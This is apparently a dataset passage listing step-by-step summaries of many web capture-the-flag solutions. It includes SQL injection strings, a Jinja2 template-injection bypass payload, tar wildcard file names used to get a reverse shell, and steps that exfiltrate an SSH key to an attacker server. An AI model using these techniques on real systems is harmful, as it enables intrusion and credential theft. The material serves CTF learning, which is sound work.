    "Discover website hosting on Nginx server 1.15.5.",
    "Send first GET request with 65534 empty spaces.",
    "Send second GET request with 65534 empty spaces.",
    "Receive 400 error response for the first GET request.",
    "Receive internal web page response for the second GET request.",
    "Place a zero between the two GET requests.",
    "Intercept the request.",
    "Set the 'Host' header manually to threeofhearts.ctf.net.",
    "Discover PHP form for var1 and var2.",
    "Submit PHP form.",
    "Receive GET request to /save.php.",
    "Populate entry in /out/save.txt.",
    "Discover /private.php.",
    "Determine inaccessibility of /private.php.",
    "Determine likelihood of hidden flag in /private.php.",
    "Discover connection between successful HTTP request smuggling attack and second request with admin headers.",
    "Send request to /save.php.",
    "Include var1 and var2 parameters in the request.",
    "Include 'Transfer-Encoding: chunked' header in the request.",
    "Include 'Content-Length:53' header in the request.",
    "Fetch headers from /out/save.txt.",
    "Fetch PHP session ID from /out/save.txt.",
    "Access /private.php.",
    "Include fetched headers in the request.",
    "Include session ID in the request.",
    "Arrive at page with the flag.",
    "Discover web app.",
    "Observe register and login pages.",
    "Navigate to registration page.",
    "Fill out registration form.",
    "Submit registration form.",
    "Inspect webpage response.",
    "Identify JavaScript variable storing user details.",
    "Intercept register request.",
    "Inspect parameters in the request.",
    "Add 'account[role]' parameter with value 'admin'.",
    "Include the parameter in the request.",
    "Verify admin privilege.",
    "Observe availability of admin button.",
    "Locate admin button on the webpage.",
    "Click the admin button.",
    "Observe flag retrieval.",
    "Performed the action of opening port 80.",
    "Performed the action of setting up socks correctly.",
    "Performed the action of accessing challenges.",
    "Performed the action of claiming the Free Flag.",
    "Identify the target port as port 11111",
    "Establish a connection to port 11111",
    "Recognize the presence of an SQL Injection vulnerability",
    "Encounter stability issues",
    "Realize the cause of stability issues is multiple users attacking simultaneously with sqlmap",
    "Successfully extract a password from the database",
    "Observe the extracted password is very long and alphanumeric",
    "Face an obstacle due to the password length exceeding the character limit of the login page",
    "Discover a method to bypass the character limit issue",
    "Use Burp Suite to pass the password despite the character limit",
    "Successfully retrieve a link",
    "Follow the retrieved link",
    "Recognize an alternative method to bypass the login via the username field",
    "Realize the alternative method involves using SQL injection",
    "Discover an alternative approach to bypass authentication",
    "Identify the password field as the entry point for bypassing authentication",
    "Fail to recognize the potential for using an SQL injection into the password field as an authentication bypass",
    "Access the website.",
    "Notice the website information.",
    "Identify User Registration section.",
    "Identify User Login section.",
    "Identify Admin Login section.",
    "Proceed with user registration.",
    "Inspect the cookies.",
    "Locate the admin cookie.",
    "Locate the authenticated-user cookie.",
    "Locate the made-an-account cookie.",
    "Locate the visited-main-page cookie.",
    "Modify the value of the admin cookie.",
    "Send the modified request.",
    "Receive the flag.",
    "Access a website.",
    "Observe a list of four different image galleries.",
    "Notice that one gallery is set to private.",
    "Realize that the private gallery cannot be unnecessarily accessed.",
    "Notice that the URL changes when querying any other galleries.",
    "Attempt to use the local-host address.",
    "Try to access the admin panel of the website.",
    "Inject an address into the URL parameter.",
    "Successfully log into the admin panel.",
    "Find a box inside the admin panel.",
    "Untick the box to make the private gallery public.",
    "Access the newly public gallery.",
    "Find the flag inside the newly public gallery.",
    "Started with port 20022",
    "Noticed that user cookie is double base64 encoded",
    "Double decoded the user cookie",
    "Found a PHP object in the decoded cookie.",
    "Identified attributes: 'username', 'admin', and 'profile_img'.",
    "Identified the task as a PHP Object Injection challenge",
    "Tried to become admin, but the server sent hints or funny responses",
    "Direct access to the flag was not successful.",
    "Used directory traversal (../) to access the flag",
    "Manipulated the 'profile_img' attribute in the PHP object",
    "Final payload was a modified PHP object with the 'profile_img' attribute pointing to the flag",
    "Inject the 'id' command in the input box.",
    "Retrieve user and read permissions from the injected command.",
    "Enclose 'ls' command in backticks.",
    "List the files using the backtick-enclosed 'ls' command.",
    "Identify the presence of 'index.php' file in the results.",
    "Execute the 'cat index.php' command.",
    "View the code of 'index.php' file.",
    "Identify blacklisted characters mentioned in the code.",
    "Determine the command length limit of 15 characters from the code.",
    "Execute the 'ls ../' command to check the parent directory.",
    "Identify the presence of 'flag.txt' file in the parent directory.",
    "Attempt to execute the 'cat ../flag.txt' command.",
    "Fail to execute the command due to exceeding the character limit.",
    "Utilize the un-blacklisted linux redirection character '<'.",
    "Read the flag using the '< ../flag.txt' command.",
    "Used curl command",
    "Sent a GET request",
    "URL: http://challenge.nahamcon.com:31428/",
    "Used X-Forwarded-For header",
    "Spoofed the client IP address",
    "Set X-Forwarded-For header",
    "Value: 127.0.0.1",
    "Emulate local host client access",
    "Aim to access internal files",
    "Accessed the given website.",
    "Observed an interface that offered XML parsing as a service.",
    "Identified that the system might be susceptible to an XXE (XML External Entity) attack.",
    "The identification was based on the mention of XML.",
    "Knew that the flag was located in /var/www.",
    "Prepared an XML payload.",
    "The XML payload was designed to extract information from /var/www.",
    "Uploaded the XML payload.",
    "The XML payload was uploaded to the 'trial' tab of the web interface.",
    "Used the 'view XML' tab on the web interface.",
    "Reviewed the XML return from the 'view XML' tab.",
    "Successfully extracted the flag from /var/www.",
    "Open the website.",
    "Examine the interface of the website.",
    "Find the URL of /robots.txt.",
    "Access the /robots.txt URL.",
    "Discover a Disallowed path /ingen/.",
    "Navigate to the disallowed path /ingen/.",
    "Discover a text file named flag.txt.",
    "Access the flag.txt file.",
    "Find the challenge flag.",
    "Inspect the Python file provided in the challenge.",
    "Note the inclusion of regex functionality.",
    "Analyze the Python code.",
    "Note that the code ignores the first letter if it's uppercase.",
    "Establish a pattern based on the previous observation.",
    "Use a debugging tool such as regex101.",
    "View code specifics using the debugging tool.",
    "Ensure understanding of the code.",
    "Consult the official Python documentation.",
    "Learn about special characters usable in regex from the documentation.",
    "Identify the '|' operator as potentially useful.",
    "Note that the '|' operator allows for matching of either of two separate regular expressions.",
    "Test the code with 'flag{randomString}'.",
    "Determine suitable regular expressions based on the test.",
    "Create a new regex matching the 'flag{randomString}' pattern.",
    "Use the '|' operator in the created regex.",
    "Replace the initial regex in the Python code.",
    "Use the newly created regex as the replacement.",
    "Obtain the flag.",
    "Visit the website.",
    "View the page source.",
    "Identify unique JavaScript with nextExport attribute.",
    "Identify unique JavaScript with autoExport attribute.",
    "Identify unique JavaScript with buildId attribute.",
    "Perform GET request to host https://space.sdc.tf with the endpoint /api/status.",
    "Receive a response indicating a healthy status and version.",
    "Notice three endpoints (/status, /rocketLaunch, /fuel) in the response.",
    "Request the /fuel endpoint.",
    "Receive a list of pumps and their IDs.",
    "Attempt a simple GET request to /rocketLaunch.",
    "Receive a notice that the request body must be JSON.",
    "Leverage the assumption that a POST request might be needed.",
    "Leverage the assumption that the word 'launch' could be a keyword.",
    "Send a POST request with 'launch' attribute set to true.",
    "Receive a missing rocket name error.",
    "Add a random rocket name to the POST request body.",
    "Receive an error indicating 'triton' as an available rocket name.",
    "Assign 'triton' as the rocket name in the POST request body.",
    "Receive an error for missing launch time.",
    "Add a random timestamp to the POST request body to understand the format.",
    "Identify the correct timestamp format.",
    "Update the timestamp in the POST request.",
    "Receive an error message indicating pumpId was missing.",
    "Add a random pump ID from earlier /fuel endpoint response.",
    "Receive an error message indicating a missing token.",
    "Scour the page source and Javascript files to locate the token.",
    "Incorporate the token identified in the Javascript files into the POST request.",
    "Successfully complete the POST request with all required parameters.",
    "Capture the flag.",
    "Read and understand the hints provided in the challenge.",
    "Submit an integer value as the input in the web application.",
    "Observe the response from the web application.",
    "Submit a blank value for the 'n' parameter in the web application.",
    "Note the behavior of the web application when a blank 'n' parameter is submitted.",
    "Submit a value for 'n' that is larger than 8 characters.",
    "Observe the error response from the web application.",
    "Submit multiple 'n' parameters with the same value in the web application.",
    "Verify that the web application does not reject the submission of duplicate 'n' parameters.",
    "Locate the 'admin' page.",
    "Locate the '.git' directory via robots.",
    "Use the internetwache GitTools.",
    "Dump file contents of websites.",
    "Dump the '.git' directory.",
    "Use an extractor tool.",
    "Get files from the dump.",
    "Locate 2 'users.db' files.",
    "Confirm that both files are sqlite3 databases.",
    "Identify the database containing 'bcrypt' hashes.",
    "Identify the database containing 'md5' hashes.",
    "Crack the md5 hashes.",
    "Locate a valid credential.",
    "Use the located credential.",
    "Login on 'admin.html'.",
    "Acquire the flag upon login.",
    "Search the blog for log file links.",
    "Identify 3 log file links.",
    "Analyze the challenge description for hints.",
    "Infer the presence of additional log files.",
    "Examine the URLs of existing logs.",
    "Generate a custom wordlist of potential log file names.",
    "Execute ffuf to fuzz the challenge site.",
    "Utilize the custom wordlist to find more logs.",
    "Observe the discovery of over 1900 logs.",
    "Use curl to search for 'sdctf' in the logs.",
    "Fail to find 'sdctf' in the logs.",
    "Execute wget to download all available logs.",
    "Retrieve all logs for further analysis.",
    "Run grep command to search for unusual text.",
    "Exclude common words from the search.",
    "Identify leaks of bash history in the logs.",
    "Discover a command related to a netcat session.",
    "Identify the presence of a potential password.",
    "Logged in as dennisb@uupeye.edu",
    "Retrieved the link to the admin portal from student communication",
    "Tried to bruteforce the admin portal without success",
    "Attempted SQL login bypass",
    "Used Burpsuite",
    "Payload used: admin@uupeye.edu' or '1'='1",
    "Successfully bypassed login and accessed the admin portal",
    "Accessed admin panel",
    "Intention to edit friend's grades specified over 4 semesters",
    "Inferred from the challenge that grades are uploaded through a json file",
    "Inspected page source",
    "Found a link for an example json file",
    "Modified the given example json file",
    "Added more semesters to the json file",
    "Set the production value to true in the json file",
    "Used the following json to upload the updated grades",
    "Uploaded changes",
    "Received flag indicating successful completion of challenge",
    "Obtain the email of the target: alexo@uupeye.edu",
    "Identify that students may have weak passwords",
    "Find students' emails exposed at https://wpiadmin.wpictf.xyz/topStudents",
    "Compile a list of emails",
    "Attempt password brute force for each email",
    "Start the brute forcing process",
    "Attempt different passwords",
    "Access all accounts with the obtained credentials",
    "Check the profile of each accessed account",
    "Look for potential flags in each profile",
    "Find a flag in the profile of dennisb@uupeye.edu",
    "Define the URL of the website.",
    "Initialize an empty password string.",
    "Create an infinite loop.",
    "Set the loop condition to run until the password is fully determined using the SQL Injection.",
    "Loop through each character.",
    "Set the range of characters to loop through as '0123456789abcdef' (hexadecimal).",
    "Create a SQL Injection payload.",
    "Use a wildcard pattern and append the current character to check if the password starts with the current guessed string.",
    "Send a POST request.",
    "Craft the payload with the SQL Injection and set it as the request body.",
    "Check the response for the text 'No such person'.",
    "If the text is found, the guess was incorrect.",
    "If the text is not found, the guess was correct.",
    "Append the current character to the password string.",
    "Trim a section of the server response using slicing.",
    "Output the password string and the trimmed section of the server response.",
    "Use a flag variable to denote a successful guess.",
    "If a guess was successful, restart the loop to guess the next character.",
    "If a guess was not successful, the full password has been guessed.",
    "Break the infinite loop.",
    "Exit the script.",
    "Visit the rule page.",
    "Read the page carefully.",
    "Keep reading until reaching the line at the bottom.",
    "Take note that the flag is represented as 'SharifCTF{MD5(lowercase(Hello_Rules))}'",
    "Open the command line tool.",
    "Launch Python.",
    "Open Python.",
    "Import the 'md5' function from 'hashlib' in Python.",
    "Open Python.",
    "Assign the string 'Hello_Rules' to a variable.",
    "Use the '.lower()' method on the variable to convert the string to lowercase.",
    "Encode the lowercase string into bytes.",
    "Use the 'md5' function to hash the bytes.",
    "Combine the hashed string with the text 'SharifCTF{' and '}' to form the flag.",
    "Investigate the HTML code of the website.",
    "Identify fields that need to be extracted.",
    "Write a Python script to automate the extraction of hidden fields from the website's HTML.",
    "Create a function 'get_hidden' in the Python script.",
    "Take a URL as an argument.",
    "Send a GET request to the URL.",
    "Extract the response text (HTML).",
    "Use regular expressions to find specific fields.",
    "Create a function 'get_passwords' that generates all possible combinations of YYYYMM from the years 1900 to 2019 and months from 1 to 13.",
    "Use the functions 'get_hidden' and 'get_passwords' in a brute-force attack to find the correct password for the username 'jack'.",
    "Log in to the website using the username 'jack' and the discovered password.",
    "Inspect the functionality of the website.",
    "Note that it includes the ability to upload photos.",
    "Note the showcasing of uploaded photos.",
    "Examine the URLs associated with different users and photos.",
    "Notice a 'session_id' stored in a cookie.",
    "Note that it is an MD5 hash.",
    "Recognize that the hash can be cracked.",
    "Experiment with the session_id.",
    "Change the hashed value to correspond to different usernames.",
    "Change the hashed value in the session_id cookie to correspond to the username 'admin'.",
    "Try to load a webpage associated with the 'admin' user.",
    "When faced with a security check.",
    "Attempt to bypass it by loading image URLs directly.",
    "Discover the security question answer from one of the images.",
    "Use the discovered security question answer to bypass the security check and log in as the 'admin' user.",
    "Find the API used to modify the status of the services.",
    "Check all npm packages for vulnerability.",
    "Identify the package fast-json-patch as vulnerable to Prototype Pollution.",
    "Confirm the Prototype Pollution vulnerability from a GitHub Pull Request.",
    "Identify that the web application is using 'ejs'.",
    "Understand that 'ejs' is capable of Remote Code Execution (RCE) due to prototype pollution.",
    "Craft a malicious payload in a POST request.",
    "Send the POST request to change the status of the services.",
    "Exploit the web application by performing Remote Code Execution (RCE) due to Prototype Pollution.",
    "Access the flag.",
    "Check the source code of the website.",
    "Find CSP settings in the source code.",
    "Discover that the site restricts images to the same origin.",
    "Identify that the site allows script tags with nonces as external resources.",
    "Recognize the possibility of embedding any code into HTML using GET parameter.",
    "Confirm the existence of XSS vulnerability at a specific URL.",
    "Understand the purpose of the attack is to display an image only when the bot accesses the site.",
    "Identify that the cookie 'token' has the httpOnly attribute.",
    "Recognize that the httpOnly attribute prevents retrieval of the cookie by XSS.",
    "Discover plan of attack involving creating a new script tag.",
    "Convert flag images to base64 data.",
    "Send image data externally using the 'src' attribute of the generated script tag.",
    "Minify the code to be read as XSS.",
    "Split the large image data into three parts.",
    "Split the data because it exceeded the length limit for the URL.",
    "Send the URLs to the bot.",
    "Send base64 encoded image data to the requestbin.",
    "Display the data in HTML to obtain the flag.",
    "Begin analysis of the verify() function.",
    "Identify verifyUsername() within the verify() function.",
    "Identify verifyPassword() within the verify() function.",
    "Identify verifyMFA() within the verify() function.",
    "Analyze verifyUsername() and find the simple string comparison indicating the correct username to be 'D0loresH4ze'.",
    "Investigate verifyPassword() and observe the use of bcrypt password verification.",
    "Refer to the PHP manual to obtain the bcrypt hash and identify the password as 'rasmuslerdorf'.",
    "Examine verifyMFA() and observe the check for a 10-digit random number.",
    "Utilize object injection to manipulate 'mfa' and '_correctValue' variables to be equal.",
    "Create the expected solution string using object injection.",
    "Encode the solution string using base64 to generate the 'userdata' parameter.",
    "Add the encoded 'userdata' as a request parameter for the mfa service.",
    "Retrieve the flag as confirmation of successful authentication.",
    "Open the XML file",
    "Locate the flag component in the XML",
    "Modify the location of the flag component in the XML",
    "Identify a Server-Side Template Injection (SSTI) vulnerability in the password field within the code.",
    "Test the SSTI vulnerability by inputting a mathematical operation as the payload into the password field.",
    "Observe the server returning the result of the operation.",
    "Identify a SQL injection vulnerability in the 'data-server' project.",
    "Execute commands using the SSTI vulnerability to read directory contents.",
    "Take note of the directory contents returned by the server.",
    "Identify an inaccessible server that is hosting data-server.",
    "Plan to send requests containing SQL to the server.",
    "Write a python script.",
    "Send an SQL payload to the inaccessible server using SSTI to force the execution.",
    "Loop through a list of characters.",
    "Append each character to an initial flag string.",
    "Create a script.",
    "Encode the script into base64.",
    "Send the encoded script as an SSTI payload.",
    "Send the payload via POST request.",
    "Check if 'True' is present in the response.",
    "If 'True' is present, append the flag string character to the flag.",
    "Note that the server filters the character '.'.",
    "Encode the script into base64 to bypass the filtering.",
    "Note that the server does not have CURL.",
    "Use a python script to send requests.",
    "Perform code analysis",
    "Identify SQL injection vulnerability",
    "Recognize user input concatenation in the SQL query",
    "Craft SQL injection payload",
    "Ensure payload always returns true",
    "Add comments to comment out the rest of the query",
    "Enter the crafted payload",
    "Execute the function",
    "Exploit the SQL injection vulnerability",
    "Retrieve the output",
    "Capture the flag",
    "Examine the cookies in the HTTP request.",
    "Identify a key called 'likeCookie' with a value of false.",
    "Change the value of 'likeCookie' to true.",
    "Observe the response message suggesting the value could range from 1 to 20.",
    "Write a Python script to automate the process.",
    "Use the 'requests' library to send HTTP GET requests.",
    "Create a for loop to iterate through the numbers from 1 to 20.",
    "Send a GET request to the target URL with each possible 'likeCookie' value (from 0 to 19).",
    "Check if the response text contains 'LITCTF{' to identify a CTF flag.",
    "Print out the corresponding 'likeCookie' value.",
    "Stop the loop.",
    "Execute the script to obtain the CTF flag.",
    "Analyzed the provided PHP code for the application's API request handling.",
    "Observed that 'c' parameter in requests was used to manipulate the user session, either to sign in, sign up, or sign out.",
    "Found that the user check 'is_admin()' would proceed to handle the 'c2' admin command parameter if true, otherwise would call 'redirect()'.",
    "Identified that 'redirect()' function did not actually terminate the script, but printed HTML output, allowing further code execution.",
    "Figured out the need of a passcode to perform admin functions.",
    "Discovered that '/lib/db/user.db' and '/lib/db/passcode.db' can be directly accessed from the server.",
    "Identified admin credentials and passcode from the accessed user database and passcode files.",
    "Discovered that 'export_db' function could be exploited to read file contents if the passcode was correct.",
    "Recognized that file path in 'export_db' function could be manipulated for path traversal.",
    "Performed a POST request to the /api.php endpoint with 'id', 'pw', 'c', 'c2', 'pas', and 'db' parameters, using path traversal to access the flag.",
    "Finally, found the flag 'ACSC{it_is_hard_to_name_a_flag...isn't_it?}'.",
    "Identify a 'genflag' server.",
    "Recognize it is intended for Server Side Request Forgery (SSRF).",
    "Recognize that 'mobile-viewer' couldn't directly interact with server.",
    "Identify remote address and user agent checks as the reasons.",
    "Notice server-rendered pages.",
    "Recognize them as screenshots.",
    "Realize the need to request 'http://genflag/flag'.",
    "Determine the need to use '/home/stypr/readflag' on 'website'.",
    "Identify 'website' as the same site for the request.",
    "Discover that 'website' runs 'yarn dev'.",
    "Realize 'yarn dev' runs 'vitepress dev src'.",
    "Identify Vitepress is in dev mode.",
    "Find that Vitepress running in dev mode enables CORS.",
    "Recognize that it opens up path traversal vulnerabilities.",
    "Use path traversal to get the SSH key.",
    "Create a CSRF request.",
    "Use Fetch API on 'mobile-viewer' page.",
    "Get the SSH key to the attacker site.",
    "Use btoa javascript function.",
    "Base64 encode the private key.",
    "Transmit it safely in an HTTP GET request to the attacker's server.",
    "Retrieve the received private key.",
    "Use it to SSH onto the target server.",
    "Obtain the flag from within the target server.",
    "Accessed the Cowsay as a Service Challenge website",
    "Analyzed the code of the website",
    "Identified the '/usr/games/cowsay' game",
    "Identified that the game is operated from 'child_process.spawnSync'",
    "Observed the settings endpoint",
    "Identified 'ctx.state.user' as the target of the settings",
    "Identified that 'ctx.state.user' equals to the 'username' cookie",
    "Realized that the setting name is user-controlled",
    "Realized the potential for prototype pollution",
    "Executed a HTTP POST request",
    "Used '__proto__' as the username parameter",
    "Set the settings",
    "Used 'shell' as the setting name in the POST request",
    "Set 'shell=true' for all objects",
    "The action of setting 'shell=true' made the command run within a shell",
    "Command injection became possible",
    "Executed a HTTP GET request",
    "Injected a command that echoes the FLAG environment variable",
    "Successfully retrieved the Flag",
    "Identify that the server uses dynamic rendering.",
    "Understand that dynamic rendering renders JavaScript on the server-side before serving web crawlers.",
    "Check the Nginx configuration.",
    "Observe the rewriting and forwarding of the request to the pre-renderer at `http://renderer:3000`.",
    "Identify that the re-writing and forwarding occurs when the `User-Agent` header is of the web crawlers.",
    "Detect the usage of Prerender to handle the requests.",
    "Infer that Chrome is used for rendering JavaScript.",
    "Set the host header.",
    "Ensure that the renderer visits our attacker-controlled site.",
    "Perform XSS attack.",
    "Redirect the browser using the `Location` header.",
    "Create a `redirect.php` file.",
    "Ensure that visiting `redirect.php` redirects the renderer's browser to the second exploit page.",
    "Construct `exploit.html` file.",
    "Create an iframe within `exploit.html` with the source set to `http://localhost:3000/render?url=http://api:8000/`.",
    "Bypass SOP.",
    "Exploit the fact that the current site and the iframe's source are both `http://localhost:3000`.",
    "Receive the contents of the iframe.",
    "Observe the received Base64 encoded string.",
    "Decode the received Base64 string.",
    "Observe the decoded flag.",
    "Review the problem statement.",
    "Notice the dependency on 'jsonwebtoken' 3.2.2 in the target application.",
    "Realize that 'jsonwebtoken' 3.2.2 has a known authentication bypass vulnerability.",
    "Examine the application's server code.",
    "Notice that the JWT token is checked in the response for '/localisation-file'.",
    "Understand that the JWT token is essentially encoded JSON data.",
    "Understand that the JWT token is signed and verified on the server-side.",
    "Notice that the public key used for the JWT token handling is stored in the '__dirname' directory.",
    "Discover that the server generates a JWT token.",
    "Discover that the 'language' field is set according to the parameter passed via the POST handler for '/localization-language'.",
    "Realize that the GET handler for '/localisation-file' allows the reading of arbitrary files.",
    "Realize that the input 'language' in the JWT token is used for reading the arbitrary files.",
    "Understand the constraints of the language input.",
    "Understand that the constraints are due to a regex check.",
    "Test the theory.",
    "Send a POST request to the '/localization-language' endpoint.",
    "Set the 'language' parameter to 'key' in the JSON data.",
    "Set the 'language' parameter to 'key' in the JWT token.",
    "Send a GET request to '/localisation-file'.",
    "Retrieve the key file.",
    "Sign the token using the retrieved public key.",
    "The server misconstrues the public key as an HMAC private key due to the vulnerability.",
    "Create a script to generate the JWT payload.",
    "Set the 'language' parameter to 'flag.txt' in the payload.",
    "Sign the token using the public key.",
    "Verify that the token is successfully signed.",
    "Verify that the 'language' parameter is indeed changed to 'flag.txt'.",
    "Use the server's own mechanism against it.",
    "Set the 'lion-token' cookie to the generated token.",
    "Read the contents of 'flag.txt'.",
    "Read the challenge description thoroughly",
    "Inspect the provided Nginx configuration for any vulnerabilities",
    "Identify the '/admin' directive in the Nginx configuration that denies all requests",
    "Discover a hidden endpoint '/admin/key' from the server code",
    "Realize that the access to '/admin/key' is needed to get the key",
    "Identify another part of the Nginx configuration that preserves request headers when requests are forwarded to Gunicorn",
    "Research on whether the HTTP headers can manipulate the processing of URL path by Gunicorn",
    "Find out that the 'SCRIPT_NAME' WSGI variable can strip its prefix from 'PATH_INFO'",
    "Understand that ‘SCRIPT_NAME’ can be set through an HTTP header, which can bypass the '/admin' denial in Nginx configuration",
    "Realize that the decryption key can be obtained by supplying a 'key_id' in the HTTP headers",
    "Use the site’s JavaScript to generate the 'key_id'",
    "Find out the decryption key by using the 'key_id'",
    "Modify the '/decrypt' endpoint to decrypt the file using the found decryption key",
    "Find out the flag",
    "Identify a Flask webpage",
    "Recognize a Server-Side Template Injection (SSTI) vulnerability",
    "Note the presence of certain blacklisted words as restriction",
    "Determine a method to bypass Jinja2 SSTI filters",
    "Recognize the usage of GET request arguments",
    "Access the GET request arguments through `request.args`",
    "Use `attr()` Jinja2 filter to pass blacklisted characters",
    "Apply `attr()` filter with payload `/submit?value={{()|attr(request.args.c)}}&c=__class__`",
    "Evaluate the object attribute and display it to the user",
    "Use the method `().__class__.__base__.__subclasses__()`",
    "Retrieve subclasses of the base class",
    "Formulate a GET request",
    "Access the subclass information",
    "Copy the output",
    "Use a Python script to find `<class 'subprocess.Popen'>` in the subclasses",
    "Identify the index of `<class 'subprocess.Popen'>` as 258",
    "Access the index 258",
    "Leverage `subprocess.Popen` for Remote Code Execution (RCE)",
    "Construct another GET request",
    "Execute 'ls' command on the server using `subprocess.Popen`",
    "Read the flag file",
    "Obtain the flag",
    "Submit an authentication request with a username.",
    "Fail the authentication.",
    "Observe that the username is reflected back into the username field.",
    "Fuzz the username input with various inputs.",
    "Observe that anything after a whitespace is removed.",
    "Observe that 'admin' is replaced in the username field.",
    "Verify that the replacement is non-recursive.",
    "Craft an SQL injection payload.",
    "Include the payload in the username parameter.",
    "Analyze the resulting SQL query.",
    "Perform the necessary action to retrieve the flag.",
    "Access the front-end JavaScript source code.",
    "Inspect the front-end JavaScript source code.",
    "Identify that Meteor is being used.",
    "Identify that data is being fetched from a MongoDB backend.",
    "Discover the exposed Meteor methods.",
    "Identify the exposed methods as 'notes.count', 'notes.add', and 'notes.remove'.",
    "Observe the 'notes.count' function.",
    "Determine that the 'notes.count' function is unauthenticated.",
    "Understand the purpose of 'notes.count'.",
    "Understand that 'notes.count' applies a filter.",
    "Understand that 'notes.count' returns the count of notes that pass the filter.",
    "Use Burp Suite.",
    "Find that 'notes.count' is being executed through websockets.",
    "Deduce the purpose of the '$ne' filter.",
    "Deduce that the '$ne' filter checks if the body of the notes is not empty.",
    "Understand the purpose of '$regex'.",
    "Understand that '$regex' allows regex patterns for note contents.",
    "Check for notes that match the regex pattern 'flag{.*}'.",
    "Test the filter.",
    "Validate that only one result is returned.",
    "Indicate that only one note contains the flag.",
    "Use the technique to bruteforce every character of the flag.",
    "Concatenate possible characters to the end of the flag.",
    "For each possible character.",
    "Check if the possible character is part of the flag.",
    "Verify if the count returns 1.",
    "Output the character if it returns a count larger than 0.",
    "Repeat the process until the entire flag ('flag{4lly0Urb4s3}') is discovered.",
    "Analyze the code.",
    "Understand the behavior of the code.",
    "Identify potential vulnerabilities.",
    "Determine the code checks file extensions for uploaded files.",
    "Identify the allowed file extensions: 'txt', 'pdf', 'doc', 'docx', 'xls', 'xlsx'.",
    "Identify the code normalizes file paths.",
    "Recognize the purpose of normalization: prevent directory traversal attacks.",
    "Discover the use of the 'os.system()' method.",
    "Identify use of the 'tar' command when downloading files.",
    "Recognize potential wildcard injection vulnerability.",
    "Understand Wildcard Injection.",
    "Recognize how Wildcard Injection can be abused for command injection attacks.",
    "Identify manipulation of wildcards in system commands as the attack method.",
    "Identify the vulnerability lies in the use of tar utility.",
    "Recognize the use of wildcards in tar utility.",
    "Identify the '--checkpoint-action' option that executes a program at a checkpoint.",
    "Understand that the program is executed when 10 records are reached by default.",
    "Understand the need to overcome file extension restrictions.",
    "Recognize the importance of bypassing file extension restrictions for a successful attack.",
    "Conceptualize the attack.",
    "Create the file '--checkpoint-action=exec=sh shell.txt'.",
    "Create the file '--checkpoint=1'.",
    "Recognize that '--checkpoint=1' does not pass the file extension check.",
    "Dig into tar documentation to find alternatives.",
    "Uncover the checkpoint creation by tar utility.",
    "Recognize that 10 records are created by tar utility by default.",
    "Understand that each record consists of 20 blocks of 512 bytes each.",
    "Devise the exploit.",
    "Upload enough bytes to exceed 10 records.",
    "Cause the checkpoint action to be executed by exceeding 10 records.",
    "Initialize a GET request.",
    "Target the URL for the GET request.",
    "Create a file 'shell.txt'.",
    "Add the desired payload to 'shell.txt'.",
    "Create a reverse shell back to attacker's machine.",
    "Create the file '--checkpoint-action=exec=sh shell.txt'.",
    "Ensure the file is empty.",
    "Understand the purpose of this file: pollute the arguments for tar command.",
    "Recognize that it passes the extension check due to .txt extension.",
    "Send POST request to upload the 'shell.txt' file.",
    "Send POST request to upload the '--checkpoint-action=exec=sh shell.txt' file.",
    "Start a loop.",
    "Generate a file with random content.",
    "Send POST request to upload the generated file.",
    "Repeat the loop until the total size exceeds 10 records.",
    "Create a file of 1024 bytes with a random name ending in '.txt'.",
    "Send a POST request to upload the created file.",
    "Create a tar archive with all the uploaded files.",
    "Verify the current size of the tar archive.",
    "Check if the combined size of uploaded files exceeds the size of 10 tar records.",
    "Send a GET request to '/download_all' to trigger the exploit.",
    "Execution of the tar command with wildcard arguments causes the payload in 'shell.txt' to be executed.",
    "Successfully obtain a reverse shell.",
    "Reverse shell is obtained on the target system.",
    "Visit lukas-app.de.",
    "Observe that it's a static site.",
    "Determine that there's not much to exploit.",
    "Perform a certificate search using crt.sh.",
    "Identify two additional subdomains through the certificate search.",
    "Notice a redirect to a different domain when fetching an image.",
    "Indicate another possible server.",
    "Final server returns Server: Apache/2.4.50 (Unix).",
    "Determine that Server: Apache/2.4.50 (Unix) is known to be vulnerable to a recent path traversal vulnerability.",
    "Attempt to exploit the vulnerability using standard payload.",
    "Fail to exploit the vulnerability.",
    "URL-encode the payload again.",
    "Bypass double URL decoding by server.",
    "Adjust exploit path based on Twitter inspiration from similar challenges.",
    "Successfully exploit the path traversal vulnerability using a triple URL-encoded payload.",
    "Read the Apache configuration file.",
    "Reveal mapping in the Apache configuration file.",
    "Hypothesize that the web app could be stored in the same directory.",
    "Read the Python source code for the web app.",
    "Find faulty secret key handling in the Python source code.",
    "Change session username to 'root' using client-side cookies.",
    "Sign the Flask cookie with the desired username to authenticate as 'root'.",
    "Visit the website with the updated cookies.",
    "Retrieve the flag.",
    "App was composed of frontend and payment backend.",
    "Separate user accounts were used.",
    "Messages were signed using ED25519.",
    "Signing was done to prevent tampering.",
    "Checked that balance never went below 0.",
    "Users were redirected to '/callback' on the frontend application.",
    "Messages and signatures were verified by the frontend.",
    "GET query parameters were added to the messages before verification.",
    "'request.args.get('amount')' was added to the user balance.",
    "Identified possibility to use 'Parameter Pollution' by having two 'amount' arguments.",
    "Created new user with username 'FRONTEND_USERNAMEamount1337' to manipulate the message format.",
    "Server was able to provide signature for this manipulated message.",
    "Performed parameter pollution on the frontend with 'GET /callback?user=FRONTEND_USERNAME&amount=1337&amount=0&nonce=NONCE&sig=SIGNATURE'.",
    "Due to frontend processing, this resulted in the same verified message but carrying a different meaning.",
    "Successfully added 1337 coins to the account.",
    "Retrieved the flag 'CSR{sometimes_it's_really_hard_to_create_good_flags}'.",
    "Signed up on the website.",
    "Viewed the invoice URL in the format '/legacy_invoice_system/BASE64_ENCODED_STRING'.",
    "Decoded the base64-encoded string.",
    "Added a special character (') to the end of the username.",
    "Caused an SQL error.",
    "Collected from the error message.",
    "Username and signup date were passed into the SQL query.",
    "No sanitization was applied.",
    "Created a custom SQLMap tamper script.",
    "Appended a payload to the back of the signup date.",
    "Base64-encoded the entire input.",
    "Passed the input to the injection point at 'GET /legacy_invoice_system/*'.",
    "Ran SQLMap with the script.",
    "Used the command 'sqlmap -r invoice.req --tamper tamper.py --threads 10 -T news_article --dump'.",
    "Dumped the database.",
    "Located the flag.",
    "Flag was located within the public news_article table of the database dump.",
    "Used SQL injection payload `1' or '1'='1`.",
    "Experimented with `1' ORDER BY` commands.",
    "Deduced the number of columns based on error return.",
    "Determined that SELECT and UNION keywords were being filtered by regex.",
    "Realized stacked queries were allowed.",
    "Used `1'; SHOW DATABASES;`.",
    "Used `1'; SHOW TABLES;`.",
    "Described the 'words' table using the `1'; DESCRIBE tablename;` command.",
    "Described the '1919810931114514' table using the `1'; DESCRIBE tablename;` command.",
